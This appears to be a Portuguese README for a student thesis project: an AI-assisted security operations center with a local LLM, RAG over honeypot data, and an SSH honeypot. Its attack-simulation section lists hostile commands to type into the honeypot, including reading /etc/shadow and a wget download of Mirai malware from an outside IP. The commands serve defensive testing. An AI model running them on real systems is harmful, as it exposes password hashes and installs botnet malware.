# 🛡️ SOC Autônomo com IA Generativa & Honeypot Edge (TCC)

Prova de Conceito (PoC) de um Centro de Operações de Segurança (SOC) autônomo com integração de Inteligência Artificial Generativa (Llama 3.2 local via Ollama), enriquecimento contínuo de Threat Intelligence (GeoIP, IoCs, Malware Hashes) e banco vetorial persistente (ChromaDB com RAG).

---

## 🚀 Como Executar o Projeto (Guia para o Grupo)

### 1. Clonar e Iniciar o Ecossistema
Certifique-se de que o Docker Desktop está em execução e execute:

```bash
docker compose up -d
```

> **Nota:** A base vetorial do **ChromaDB** já vem pré-populada e persistida na pasta `./chroma_data/`. Assim que os contêineres subirem, o frontend já exibirá os incidentes, mapas e IoCs coletados.

---

### 2. Ativar o Assistente RAG Local (Apenas na 1ª Execução)
Para testar o Chatbot Forense com IA (Aba 4 - RAG SOC) no seu computador, é necessário baixar os dois modelos locais no contêiner do Ollama:

```bash
# Modelo de Embeddings (transforma texto em vetores de 768 dimensões)
docker exec -it ollama_tcc ollama pull nomic-embed-text

# Modelo de Linguagem (analista cognitivo de incidentes e MITRE ATT&CK)
docker exec -it ollama_tcc ollama pull llama3.2
```

---

### 3. Painéis e Endpoints Disponíveis

| Serviço | URL | Descrição |
| :--- | :--- | :--- |
| **Streamlit SOC Dashboard** | `http://localhost:8501` | Painel tático, Mapa de Ameaças, IoCs, Malwares e Chat RAG |
| **Grafana Observability** | `http://localhost:3000` | Dashboards de telemetria e linha do tempo de ataques |
| **Alerts API (FastAPI)** | `http://localhost:5000` | Endpoints de ingestão (`/webhook`), alertas (`/alerts`), IoCs (`/iocs`) e RAG (`/chat`) |
| **ChromaDB Vector Store** | `http://localhost:8000` | Banco vetorial indexado com a coleção `honeypot_attacks` |

---

### 4. Simulação de Ataques (Opcional)
Para disparar novos eventos no honeypot e ver os alertas e a IA respondendo em tempo real:

```bash
# 1. Limpa a chave anterior do SSH local caso necessário
ssh-keygen -f "$HOME/.ssh/known_hosts" -R "[localhost]:2222"

# 2. Conecta no Honeypot (senha padrão: password)
ssh root@localhost -p 2222

# 3. Teste digitar comandos maliciosos como:
# uname -a
# cat /etc/shadow
# wget http://185.220.101.5/mirai.arm7 -O /tmp/mirai
# exit
```
